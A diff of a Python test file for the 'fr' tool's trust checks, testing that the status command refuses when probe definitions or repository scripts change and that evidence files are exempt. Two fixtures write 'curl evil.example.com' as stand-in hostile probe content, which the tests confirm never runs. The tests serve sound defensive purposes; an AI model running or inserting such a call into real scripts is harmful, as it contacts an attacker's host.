@@ -277,10 +277,11 @@ def test_status_refuses_after_a_probe_changes_and_names_it(tmp_path: Path, monke
     _trust(root, monkeypatch)
     ops = root / PLAN_REL / "ops.yaml"
     ops.write_text(ops.read_text().replace("touch probe-ran;", "curl evil.example.com;"))
+    _commit(root, "edit a probe")
     result = _status(root, monkeypatch)
     assert result.exit_code == 2
-    assert "changed: rotate" in result.output
-    assert "create-key" not in result.output.split("changed:")[1]
+    changed = result.output.split("changed:")[1].splitlines()[0]
+    assert "rotate" in changed and "create-key" not in changed
 
 
 def test_no_help_text_calls_a_probe_read_only() -> None:
@@ -361,3 +362,80 @@ def test_status_refuses_after_a_probe_setting_changes(tmp_path: Path, monkeypatc
     result = _status(root, monkeypatch)
     assert result.exit_code == 2
     assert CONFIG_KEY in result.output.split("changed:")[1]
+
+
+# --- addendum 3: the trust tree is the whole tree minus fr's evidence files -------
+
+
+def test_a_new_script_under_docs_superpowers_invalidates_trust(tmp_path: Path, monkeypatch) -> None:
+    """A probe could run `docs/superpowers/x.sh`; the code tree `tests: reuse` uses
+    drops that prefix, so trust must not."""
+    root = _repo(tmp_path)
+    _trust(root, monkeypatch)
+    (root / "docs/superpowers/x.sh").write_text("curl evil.example.com\n")
+    _commit(root, "a script fr's code tree would not see")
+    result = _status(root, monkeypatch)
+    assert result.exit_code == 2
+    assert "docs/superpowers/x.sh" in result.output
+    assert not (root / "probe-ran").exists()
+
+
+def test_frs_evidence_files_do_not_invalidate_trust(tmp_path: Path, monkeypatch) -> None:
+    root = _repo(tmp_path)
+    _trust(root, monkeypatch)
+    for rel in (
+        "docs/superpowers/journals/plans/other.md",
+        "docs/superpowers/runs/r1.yaml",
+        "docs/superpowers/runs/r1.records/step.yaml",
+        "docs/acceptance/matrix.yaml",
+        "docs/acceptance/report_local.html",
+        "docs/acceptance/report_linked.html",
+        "docs/acceptance/report_linked.md",
+    ):
+        (root / rel).parent.mkdir(parents=True, exist_ok=True)
+        (root / rel).write_text("evidence\n")
+    result = _status(root, monkeypatch)  # uncommitted evidence is not dirty code
+    assert result.exit_code == 0, result.output
+    (root / "probe-ran").unlink()
+    _commit(root, "chore(fr): evidence")
+    result = _status(root, monkeypatch)
+    assert result.exit_code == 0, result.output
+
+
+def test_a_dirty_non_excluded_file_refuses(tmp_path: Path, monkeypatch) -> None:
+    root = _repo(tmp_path)
+    _trust(root, monkeypatch)
+    (root / "docs/superpowers/plans/p/notes.sh").write_text("x\n")
+    result = _status(root, monkeypatch)
+    assert result.exit_code == 2
+    assert "docs/superpowers/plans/p/notes.sh" in result.output and "uncommitted" in result.output
+
+
+def test_trust_excluded_is_exactly_frs_evidence() -> None:
+    from fr.ops.trust import is_trust_excluded
+
+    for path in (
+        "docs/superpowers/journals/plans/p.md",
+        "docs/superpowers/journals/specs/s.md",
+        "docs/superpowers/runs/r.yaml",
+        "docs/superpowers/runs/r.records/a.yaml",
+        "docs/acceptance/matrix.yaml",
+        "docs/acceptance/report_linked.md",
+    ):
+        assert is_trust_excluded(path), path
+    for path in (
+        "docs/superpowers/x.sh",
+        "docs/superpowers/journals/plans/run.sh",
+        "docs/superpowers/plans/p/ops.yaml",
+        "docs/superpowers/specs/s.md",
+        "docs/acceptance/other.sh",
+        "scripts/probe.sh",
+    ):
+        assert not is_trust_excluded(path), path
+
+
+def test_a_token_referenced_excluded_file_is_still_hashed(tmp_path: Path) -> None:
+    (tmp_path / "docs/superpowers/runs").mkdir(parents=True)
+    (tmp_path / "docs/superpowers/runs/probe.sh").write_text("true\n")
+    fp = fingerprint([_lo(check="bash docs/superpowers/runs/probe.sh")], OpsConfig(), tmp_path)
+    assert "file:docs/superpowers/runs/probe.sh" in fp
